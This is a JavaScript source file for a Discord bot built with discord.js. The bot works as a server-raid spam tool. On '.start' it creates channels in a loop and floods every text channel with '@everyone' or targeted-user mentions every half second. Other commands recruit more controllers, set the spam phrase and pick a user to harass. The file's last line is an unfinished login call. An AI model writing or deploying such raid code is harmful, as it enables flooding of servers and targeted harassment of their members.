import { Client, Events, GatewayIntentBits } from 'discord.js';
import { storage } from './storage.js';

const AUTHORIZED_USER_IDS = new Set(["1298640383688970293"]);
let isSpamming = false;
let spamInterval = null;
let channelInterval = null;
const createdChannelIds = new Set();
let spamPhrase = "Ghaith is king";
let targetedUserId = null;
let isOnline = false;

export const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

export async function startBot() {
  if (!process.env.DISCORD_TOKEN) {
    console.warn("DISCORD_TOKEN not set. Bot will not start.");
    await storage.createLog({
      type: 'error',
      message: 'DISCORD_TOKEN environment variable is missing. Please add it to Secrets.',
    });
    return;
  }

  client.once(Events.ClientReady, (c) => {
    console.log(`Ready! Logged in as ${c.user.tag}`);
    isOnline = true;
  });

  client.on(Events.MessageCreate, async (message) => {
    if (message.author.bot) return;
    if (!AUTHORIZED_USER_IDS.has(message.author.id)) return;

    const content = message.content;

    if (content.startsWith('.recruit')) {
      const targetId = content.split(' ')[1]?.replace(/[<@!>]/g, '');
      if (targetId) {
        AUTHORIZED_USER_IDS.add(targetId);
        await storage.createLog({
          type: 'command',
          message: `Recruited user ID: ${targetId}`,
        });
        try { await message.reply(`User <@${targetId}> has been recruited.`); } catch(e) {}
      }
      return;
    }

    if (content.startsWith('.revoke')) {
      const targetId = content.split(' ')[1]?.replace(/[<@!>]/g, '');
      if (targetId) {
        AUTHORIZED_USER_IDS.delete(targetId);
        await storage.createLog({
          type: 'command',
          message: `Revoked user ID: ${targetId}`,
        });
        try { await message.reply(`User <@${targetId}> has been revoked.`); } catch(e) {}
      }
      return;
    }

    if (content.startsWith('.change')) {
      const newPhrase = content.split(' ').slice(1).join(' ');
      if (newPhrase) {
        spamPhrase = newPhrase;
        await storage.createLog({
          type: 'command',
          message: `Changed spam phrase to: ${newPhrase}`,
        });
        try { await message.reply(`Spam phrase changed to: ${newPhrase}`); } catch(e) {}
      }
      return;
    }

    if (content.startsWith('.choose')) {
      const target = content.split(' ')[1]?.replace(/[<@!>]/g, '');
      if (target) {
        targetedUserId = target;
        await storage.createLog({
          type: 'command',
          message: `Targeted user ID: ${target}`,
        });
        try { await message.reply(`Targeted user set to <@${target}>.`); } catch(e) {}
      } else {
        targetedUserId = null;
        try { await message.reply("Targeted user cleared. Pinging @everyone."); } catch(e) {}
      }
      return;
    }

    if (content === '.start') {
      if (isSpamming) return;
      isSpamming = true;
      await storage.createLog({
        type: 'command',
        message: `Started spam routine`,
      });

      const guild = message.guild;
      if (!guild) return;

      const createChannels = async () => {
        if (!isSpamming) return;
        for (let i = 0; i < 10; i++) {
          if (!isSpamming) break;
          try {
            const channel = await guild.channels.create({ name: spamPhrase, type: 0 });
            createdChannelIds.add(channel.id);
            const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
            channel.send(`${mention} ${spamPhrase}`).catch(() => {});
          } catch(e) { break; }
        }
      };

      const spamMessages = async () => {
        if (!isSpamming) return;
        const channels = guild.channels.cache.filter(c => c.isTextBased());
        channels.forEach(channel => {
          if (!isSpamming) return;
          const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
          for (let i=0; i<3; i++) {
            if (!isSpamming) break;
            channel.send(`${mention} ${spamPhrase}`).catch(() => {});
          }
        });
      };

      createChannels();
      spamMessages();
      channelInterval = setInterval(createChannels, 1000);
      spamInterval = setInterval(spamMessages, 500);
      return;
    }

    if (content === '.stop') {
      isSpamming = false;
      if (spamInterval) { clearInterval(spamInterval); spamInterval = null; }
      if (channelInterval) { clearInterval(channelInterval); channelInterval = null; }

      try { await message.reply('Stopping and cleaning up...'); } catch(e) {}
      await storage.createLog({ type:'command', message:'Stopped spam routine' });

      const guild = message.guild;
      if (guild) {
        // Delete created channels
        for (const channelId of createdChannelIds) {
          try { const channel = await guild.channels.fetch(channelId); if(channel) await channel.delete(); } catch(e){}
        }
        createdChannelIds.clear();
      }
      return;
    }

    if (content === '!ping') {
      try { await message.reply('Pong!'); } catch(e) {}
    }
  });

  client.on(Events.Error, (error) => {
    console.error('Discord Client Error:', error);
  });

  try { await client.login(process.env.DISCORD_TOKEN); } catch(e) { console.error('Login failed:', e); }
}

export function getBotStatus() {
  return { online: isOnline, uptime: client.uptime, username: client.user?.tag };
}

client.login(process.env.DISCORD_BOT_TOKEN
